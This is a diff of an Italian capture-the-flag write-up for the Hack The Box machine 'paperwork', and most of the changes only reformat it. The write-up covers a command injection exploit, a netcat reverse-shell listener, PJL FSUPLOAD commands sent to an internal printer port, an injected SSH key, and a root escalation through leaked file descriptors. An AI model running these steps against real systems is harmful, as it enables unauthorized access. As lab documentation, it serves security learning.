@@ -27,7 +27,7 @@ PORT     STATE SERVICE        VERSION
 ### Exploitation paperwork
 ispezionando il codice dell'archivio scaricato `paperwork-archive-v1.02` o scoperto che soffre di una vulnerabilità Command Injection cosi mi sono scritto un `exloit.py` 
 
-```bash
+```python
 
 \#!/usr/bin/env python3
 
@@ -55,9 +55,10 @@ s.send(b'\x00') # Byte finale di chiusura sessione
 
 \# 5. Leggi l'esito finale
 print("Risposta Finale:", s.recv(1024))
-s.close()```
+s.close()
+```
+```lua
 
-```bash
 	nc -lvnp 4444
 	
 	lp@paperwork:/opt/LPDServer$ whoami
@@ -68,10 +69,11 @@ s.close()```
 + ispezionando il systema `which nc`,mi sono accorto che non era installato di defaul il che la cosa mi e parsa strana, allora o scaricato un ncat statico su (https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat)
 + dopo aver inspezionato la porta interna >*127.0.0.1:9100 con `./ncat 127.0.0.1 9100 ` o trovato un servizio che mi a permesso di eseguire un comando;
 
-```bash
+```js
 	printf "\x1b%%-12345X@PJL FSUPLOAD NAME=\"jetdirect.py\"\n\x1b%%-12345X\n" | ./ncat 127.0.0.1 9100
 ```
-```result 
+
+```js 
 jetdirect.py
 @PJL FSUPLOAD NAME="jetdirect.py" SIZE=5119
 
@@ -231,9 +233,9 @@ if __name__ == "__main__":
                 client.reply("OK\r\n")
         client.close()
 ```
-###
-### moviment lateral user archivist
-dopo l'ispezione del codice trovato o notato che vi era una possibile `comand injection`
+
+#### moviment lateral user archivist
+- [x] dopo l'ispezione del codice trovato o notato che vi era una possibile `comand injection`
 allora o preparato delle chiavi `ssh`;
 
 ```bash
@@ -247,7 +249,7 @@ allora o preparato delle chiavi `ssh`;
         | ./ncat 127.0.0.1 9100
 	
 ```
-#connessione alla macchina victima tramite ssh ed il file creato:
+### connessione alla macchina victima tramite ssh ed il file creato:
 dopo aver generato e trasferito la chiave pubblica `id_rsa.pub` nella macchina vittima con il seguente comando;
 
 ```bash
@@ -258,17 +260,18 @@ dopo aver generato e trasferito la chiave pubblica `id_rsa.pub` nella macchina v
 	
 	ssh -i id.rsa archivist@10.129.114.139 (da kali)
 ```
-# Privilege escaation
-## La scoperta del "Ponte" (Il Socket Unix)
-Esaminando il sistema, abbiamo trovato il file /etc/paperwork/admin_pins.conf. Sapevamo che conteneva il segreto per diventare root, 
-ma provando a leggerlo ricevevamo un errore di permessi (Permission denied), perché quel file è leggibile solo dall'utente root.
-Facendo una scansione delle connessioni interne, abbiamo scoperto un Socket Unix attivo: /run/paperwork/mgmt.sock.
-I permessi di questo file speciale dicevano che il tuo utente (archivist) aveva il diritto di parlarci. Interrogandolo, il socket rispondeva con:
+## Privilege escaation
+#### La scoperta del "Ponte" (Il Socket Unix)
+- Esaminando il sistema, abbiamo trovato il file /etc/paperwork/admin_pins.conf. Sapevamo che conteneva il segreto per diventare root, 
+- ma provando a leggerlo ricevevamo un errore di permessi (Permission denied), perché quel file è leggibile solo dall'utente root.
+- Facendo una scansione delle connessioni interne, abbiamo scoperto un Socket Unix attivo: /run/paperwork/mgmt.sock.
+- I permessi di questo file speciale dicevano che il tuo utente (archivist) aveva il diritto di parlarci. Interrogandolo, il socket rispondeva con:
 
-* STATUS: SYSTEM_CLEAN
-* SIGNATURE: <un hash SHA-256>
+**STATUS: SYSTEM_CLEAN**
 
-#La vulnerabilità: File Descriptor Leakage (SCM_RIGHTS)
+**SIGNATURE: <un hash SHA-256>**
+
+### La vulnerabilità: File Descriptor Leakage (SCM_RIGHTS)
 Guardando dentro la funzione trigger_lockdown(conn) del codice di root, abbiamo trovato la falla di sicurezza macroscopica:
 
 + evidence_bundle = array.array("i", [log_fd, admin_fd])
@@ -283,7 +286,8 @@ Lo script fa tutto in memoria alla velocità del processore.
 Scrive la parola chiave esatta cercata dal `demone (FSUPLOAD)` nel file di log e,
 un microsecondo dopo, apre la connessione verso il socket.
 
-```python3 scripting escalation
+```python
+
 \#!/usr/bin/env python3
 
 import socket
@@ -337,10 +341,18 @@ else:
 s.close()
 ```
 
-```bash
+<details>
+	<summary>⚠️Authenticatio to root user (click to expand)</summary>
+
+```js
 	su $passwd
 	
 	whoami 
 	root
+
 ```
-# macchina paperwork HTB
+</details>
+
+#### macchina paperwork HTB
+
+- [x] Info e contact: <salvo8253@live.it>
